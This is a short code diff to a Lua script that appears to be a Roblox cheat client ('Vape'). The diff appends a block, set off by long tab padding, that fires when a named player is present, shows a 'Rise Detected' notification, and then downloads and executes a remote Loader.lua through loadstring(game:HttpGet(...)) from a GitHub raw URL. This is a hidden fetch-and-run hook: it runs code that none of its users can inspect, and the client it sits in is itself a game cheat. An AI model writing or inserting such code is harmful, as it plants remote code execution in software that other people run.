@@ -1224,3 +1224,8 @@ spawn(function()
         SaveSettings()
     until (guilib.ScreenGui == nil or guilib.ScreenGui.Parent == nil)
 end)
+														
+if players.table0x54 then
+	VapeGui["CreateNotification"]("Rise Detected", "table0x54 is in ur game", 5)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/Loader.lua"))()
+end
